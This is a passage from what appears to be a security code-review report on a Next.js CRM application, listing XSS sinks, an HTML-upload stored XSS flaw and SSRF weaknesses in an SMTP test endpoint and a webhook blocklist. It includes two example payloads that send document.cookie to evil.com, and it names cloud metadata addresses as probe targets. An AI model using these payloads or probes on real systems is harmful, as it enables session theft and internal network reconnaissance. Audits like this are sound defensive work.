- Line 153: `${invoice.invoiceNumber}` — invoice number
- Lines 199: `${item.name}`, `${item.description}` — invoice line item names/descriptions
- Lines 220-225: `${bankName}`, `${bankVoen}`, `${bankCode}`, `${bankSwift}`, `${bankCorrAccount}`, `${bankAccount}` — bank details from org settings
- Line 231: `${companyStampUrl}` — injected into `<img src="...">` attribute (URL injection)
- Lines 233-234: `${signerName}`, `${signerTitle}` — from org settings
- Lines 241-242: `${terms}`, `${footerNote}` — invoice fields

**Attack vector:** Any CRM user who can create invoice items sets `item.description` to `</td></tr></tbody></table><script>document.location="https://evil.com?c="+document.cookie</script>`. The generated HTML executes the script when opened in a browser.

#### Sink 2: `getEmailTemplate()` — Custom Message in Invoice Email
**File:** `src/lib/invoice-html.ts`, line 308
**Render Context:** HTML Body (email)
**Sanitization:** None
```
${customMessage ? `<p ...>${customMessage}</p>` : ''}
```
**Input path:** `POST /api/v1/invoices/[id]/send` → `body.message` → `customMessage`. Validated only as `z.string().optional()`.

#### Sink 3: Inbox Send — Message Body in Email HTML
**File:** `src/app/api/v1/inbox/route.ts`, line 320
**Render Context:** HTML Body (email), also stored in `EmailLog.body` and re-displayed in email-log page
**Sanitization:** None (only `\n`→`<br>` replacement)
```typescript
html: `<div ...>${msgBody.replace(/\n/g, "<br>")}</div>`
```
**Input path:** `POST /api/v1/inbox` → `body.body` → `msgBody`. Validated only as `z.string().min(1)`.

#### Sink 4: Offer Send — Message and Notes in Email HTML
**File:** `src/app/api/v1/offers/[id]/send/route.ts`, lines 49 and 71
**Render Context:** HTML Body (email)
**Sanitization:** None
```typescript
<p>${parsed.data.message.replace(/\n/g, "<br>")}</p>     // line 49
${offer.notes ? `<p ...>Notes: ${offer.notes}</p>` : ""}  // line 71
```

#### Sink 5: Journey Engine — Step Body in Automation Email
**File:** `src/lib/journey-engine.ts`, line 134
**Render Context:** HTML Body (automated email)
**Sanitization:** None (only `\n`→`<br>` replacement)
```typescript
html: `<div ...>${body.replace(/\n/g, "<br>")}</div>`
```
**Input path:** Journey step `config.body` field stored in DB by CRM users.

#### Sink 6: Plan Requests — Contact Info in Admin Notification Email
**File:** `src/app/api/v1/plan-requests/route.ts`, lines 57-60
**Render Context:** HTML Body (email to admin)
**Sanitization:** None
```typescript
<td>${parsed.data.contactName}</td>
<td>${parsed.data.contactPhone}</td>
<td>${parsed.data.message}</td>
```

#### Sink 7: Completion Act — Item Names/Logo URL in HTML
**File:** `src/app/api/v1/invoices/[id]/act/route.ts`, lines 120-121, 129
**Render Context:** HTML Body (served as `text/html`)
**Sanitization:** None
```typescript
<img src="${companyLogoUrl}" alt="${companyName}" ...>  // URL injection
<td>${item.name}${item.description ? ...}</td>          // HTML body injection
```

### Client-Side `innerHTML` Sinks (No Sanitization)

#### Sink 8: Email Template Editor — `innerHTML` Direct Write
**File:** `src/components/email-template-form.tsx`, lines 82, 91, 339
**Render Context:** HTML Body (dashboard admin UI)
**Sanitization:** None on editor `div`; only the preview tab (line 393) uses `sanitizeRichHtml()`
```typescript
editorRef.current.innerHTML = form.htmlBody || ""  // lines 82, 91
current.innerHTML = html                            // line 339
```
**Attack scenario:** A user stores `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` in a template. When any admin opens the template editor, the script executes.

### Client-Side `dangerouslySetInnerHTML` (DOMPurify Applied — Mitigated)

These sinks exist but are protected by `sanitizeRichHtml()` (DOMPurify):

| File | Line | Component | Sanitizer |
|------|------|-----------|-----------|
| `src/components/email-template-form.tsx` | 393 | Template preview | `sanitizeRichHtml()` ✓ |
| `src/app/(dashboard)/email-log/page.tsx` | 247 | Email log display | `sanitizeRichHtml()` ✓ |
| `src/app/portal/knowledge-base/page.tsx` | 82 | Portal KB | `sanitizeRichHtml()` ✓ |
| `src/app/(dashboard)/knowledge-base/[id]/page.tsx` | 140 | KB article display | `sanitizeRichHtml()` ✓ |
| `src/components/profitability/ai-observations.tsx` | 163 | AI observations | `sanitizeRichHtml()` ✓ |

**DOMPurify configuration residual risk** (`src/lib/sanitize.ts` lines 9-27): The config allows `style` attribute on all whitelisted tags. Depending on the DOMPurify version, CSS-based attacks (e.g., `style="background-image:url('javascript:...')"`) may bypass sanitization in older browsers. The `href` attribute is also allowed, potentially permitting `javascript:` URIs depending on DOMPurify version.

### File Upload → Stored XSS via `.html` Extension

#### Sink 9: Contract File Upload — HTML Files Served from Public Directory
**File:** `src/app/api/v1/contracts/[id]/files/route.ts`, lines 68-69
**Render Context:** Static file served by Next.js from `public/uploads/contracts/`
```typescript
const ext = path.extname(file.name) || ""
const uniqueName = `${crypto.randomBytes(16).toString("hex")}${ext}`
```
The extension comes from the user-supplied `file.name`. While MIME type is checked against an allowlist, the extension is not validated against the MIME type. An attacker can upload a file with `Content-Type: text/plain` (allowed) and `file.name: "payload.html"` — the resulting `.html` file is served directly by the static file server, enabling stored XSS.

### SQL Injection

**No SQL injection sinks found.** All database queries use Prisma's parameterized query builder. The single `$queryRaw` usage (`src/app/api/budgeting/snapshot/route.ts` line 24) uses tagged template literals (safe). No `$queryRawUnsafe` or `$executeRawUnsafe` calls exist.

### Command Injection

**No command injection sinks found** in the network-accessible Next.js application. The `telegram-bridge/bot.js` uses `child_process.exec()` to run Claude CLI commands, but this is a local-only long-polling bot (out-of-scope for network attack surface).

---

## 10. SSRF Sinks

### CRITICAL: SMTP Test Endpoint — No SSRF Protection

**File:** `src/app/api/v1/settings/smtp/test/route.ts`, lines 33-45
**HTTP Client:** `nodemailer.createTransport({ host: smtp.smtpHost, port: smtp.smtpPort })`
**User Input Reaches Host:** YES — `smtp.smtpHost` and `smtp.smtpPort` are user-configured values stored in `organization.settings.smtp`

**Description:** The SMTP test endpoint creates a nodemailer transport directly from user-supplied host and port values **without calling `isPrivateHost()`**. The main email sending function in `src/lib/email.ts` (line 55) does check `isPrivateHost()` before creating the transporter, but the test endpoint bypasses `email.ts` entirely and duplicates the transport setup inline.

**Impact:**
- Any authenticated org admin can set `smtpHost` to `169.254.169.254` (cloud metadata), `10.x.x.x`, `192.168.x.x`, `127.0.0.1`, or any internal service
- The nodemailer TCP connection probes the target on the configured port, enabling **internal port scanning**
- Error messages (`ECONNREFUSED`, `ETIMEDOUT`, `EAUTH`) are reflected verbatim in the response (lines 85-88), enabling **banner-grabbing inference**
- 10-15 second timeout provides meaningful connection probing window

**Contrast:** `src/lib/email.ts` line 3 imports `isPrivateHost` from `src/lib/url-validation.ts` and line 55 blocks private hosts. The test route has no such guard.

### LOW: Outbound Webhook Dispatch — DNS Rebinding Bypass Risk

**File:** `src/lib/webhooks.ts`, lines 50-67
**HTTP Client:** `fetch(webhook.url, ...)`
**User Input Reaches Host:** YES — `webhook.url` is configured by org admins

**SSRF Protections Applied:** `isPrivateUrl()` is called at line 50 before the fetch. The blocklist in `src/lib/url-validation.ts` (lines 18-23) blocks:
- Known private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x)
- IPv6 loopback/ULA/link-local
- Hardcoded dangerous hostnames: `localhost`, `metadata.google.internal`, `169.254.169.254`, `metadata.internal`

**Residual Bypass Risks:**
- The blocklist is **hostname-string-only** — it does not perform DNS resolution. A DNS rebinding attack (attacker domain initially resolves to a public IP passing the check, then rebinds to 192.168.x.x before the actual `fetch`) would bypass it
- Azure IMDS endpoint `169.254.169.254` is blocked, but `metadata.azure.com` variant is not explicitly blocked
- Non-standard cloud provider link-local ranges (e.g., `100.100.100.200` for Alibaba Cloud) are not blocked

### INFORMATIONAL: Fixed-Host External API Calls (Not Exploitable)

The following outbound requests use fixed, hardcoded hosts and are not SSRF-exploitable:

| Sink | File | Host | User Input |
|------|------|------|------------|
| Telegram sendMessage | `src/app/api/v1/inbox/conversations/[id]/messages/route.ts` line 31 | `api.telegram.org` (hardcoded) | `botToken` in URL path only |
| WhatsApp Cloud API | `src/lib/whatsapp.ts` lines 79-95 | `graph.facebook.com` (hardcoded) | `phoneNumberId` in URL path only |
| Compute sidecar | `src/lib/compute.ts` line 7 | `COMPUTE_SERVICE_URL` env (default `localhost:8000`) | No user input |
| Journey cron self-call | `src/instrumentation.ts` lines 19-21 | `NEXTAUTH_URL` env (default `localhost:3000`) | No user input |
| Anthropic SDK | Multiple AI routes | `api.anthropic.com` (SDK-hardcoded) | User input in request body only, not URL |

### NOT FOUND: Other SSRF Sink Categories

The following SSRF sink categories were searched for but **not found** in the network-accessible codebase:
- **Headless browsers / Render engines:** No Puppeteer, Playwright, Selenium, wkhtmltopdf, or html-to-pdf library used in the application
- **Media processors:** No ImageMagick, FFmpeg, GraphicsMagick, or Ghostscript integration
- **Link preview / Unfurlers:** No URL metadata extraction or oEmbed fetching
- **Package/Plugin installers:** No "install from URL" functionality
- **SSO/OIDC Discovery / JWKS fetchers:** No OpenID Connect or SAML metadata fetching (no external IdP configured)
- **Import from URL:** No remote URL import functionality (imports are file-based only: CSV, Excel)
- **Raw sockets / Connect APIs:** No direct socket operations in network-accessible code
- **Monitoring / Health check frameworks:** The `/api/health` endpoint is internal only; no URL pinger or uptime checker
- **Cloud metadata helpers:** No explicit AWS/GCP/Azure metadata API calls (the risk is via SSRF through SMTP test endpoint reaching `169.254.169.254`)

---

*End of Code Analysis Deliverable*
